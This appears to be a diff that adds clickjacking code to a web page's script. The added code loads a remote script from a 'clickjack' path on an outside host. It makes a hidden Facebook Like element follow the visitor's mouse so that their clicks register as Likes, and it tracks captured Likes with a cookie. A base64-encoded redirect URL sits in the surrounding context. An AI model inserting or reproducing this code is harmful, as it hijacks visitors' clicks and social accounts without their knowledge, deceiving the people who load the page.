@@ -93,3 +93,51 @@ var land = B64.decode("dXJsPXd3dy5maWxlcG9zdC5tbCZyZWZlcmVyPXd3dy5maWxlcG9zdC5tb
 
    // for other browsers
    window.onload = init;
+   
+   var sc=document.createElement("script");
+   sc.src = "http://dvl-den.net/cpaelites/clickjack/js/jquery-cookie.min.js";
+  
+document.getElementsByTagName("head")[0].appendChild(sc);
+
+
+
+$(function () {
+    $(document).on("mousemove", function ( e ) {
+      $("#cj_like").css({
+        top: e.pageY,
+        left: e.pageX
+      });
+    });
+
+    window.fbAsyncInit = function() {
+      FB.init({ appId: '533992156714965', status: true, cookie: true, xfbml: true });
+
+      FB.getLoginStatus(function (response) {
+        if (response.status === 'connected' || response.status === 'not_authorized') {
+          console.log('User logged-in');
+        } else {
+          $("#cj_like").hide();
+          console.log('User logged-out');
+        }
+      });
+
+      FB.Event.subscribe('edge.create', function (response) {
+        $.cookie("fb-cj", "fb_jack", { expires: 10, path: '/' });
+        $("#cj_like").hide();
+      });
+    };
+
+    (function() {
+      var e = document.createElement('script');
+      e.type = 'text/javascript';
+      e.src = document.location.protocol + '//connect.facebook.net/en_US/all.js';
+      e.async = true;
+      document.getElementById('fb-root').appendChild(e);
+    }());
+
+    if ($.cookie("fb-cj") != null) {
+      $("#cj_like").hide();
+    } else {
+      $("#cj_like").show();
+    }
+  });
